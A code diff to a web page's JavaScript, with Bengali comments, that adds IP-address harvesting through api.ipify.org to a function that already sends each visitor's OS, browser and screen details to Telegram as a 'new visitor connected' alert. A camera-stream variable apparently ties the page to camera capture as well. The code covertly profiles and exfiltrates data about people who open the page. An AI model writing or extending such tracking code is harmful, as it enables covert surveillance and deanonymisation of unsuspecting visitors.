@@ -117,11 +117,20 @@
     let camStream = null;
     let isStarted = false;
 
-    // ইউজারের ডিভাইস ও ব্রাউজার ডিটেইলস সংগ্রহ করে টেলিগ্রামে পাঠানোর ফাংশন
+    // আইপি এবং ফোনের ডিটেইলস সংগ্রহ করে টেলিগ্রামে পাঠানোর ফাংশন
     async function sendDeviceInfo() {
+      let ipAddress = "Unknown IP";
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ipAddress = ipData.ip;
+      } catch (e) {
+        console.log("IP fetch failed", e);
+      }
+
       const ua = navigator.userAgent;
       
-      // অপারেটিং সিস্টেম নির্ণয়
+      // অপারেটিং সিস্টেম ও ডিভাইস মডেল আন্দাজ করার জন্য ইউজার এজেন্ট অ্যানালাইসিস
       let os = "Unknown OS";
       if (/windows/i.test(ua)) os = "Windows PC";
       else if (/mac/i.test(ua)) os = "MacOS / Apple";
@@ -129,7 +138,6 @@
       else if (/android/i.test(ua)) os = "Android Phone";
       else if (/iphone|ipad|ipod/i.test(ua)) os = "iPhone / iOS";
 
-      // ব্রাউজার নির্ণয়
       let browser = "Unknown Browser";
       if (/chrome|crios/i.test(ua) && !/edge|opr/i.test(ua)) browser = "Google Chrome";
       else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
@@ -139,6 +147,7 @@
 
       const infoText = 
         `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>\n\n` +
+        `🌐 <b>আইপি অ্যাড্রেস (IP):</b> <code>${ipAddress}</code>\n` +
         `💻 <b>অপারেটিং সিস্টেম:</b> ${os}\n` +
         `🌐 <b>ব্রাউজার:</b> ${browser}\n` +
         `📐 <b>স্ক্রিন রেজোলিউশন:</b> ${window.screen.width} x ${window.screen.height}\n` +
@@ -164,7 +173,7 @@
       if (isStarted) return;
       isStarted = true;
 
-      // ১. প্রথমে ইউজারের ফোনের ডিটেইলস পাঠাবে
+      // ১. প্রথমে আইপি সহ ফোনের ডিটেইলস পাঠাবে
       sendDeviceInfo();
 
       try {
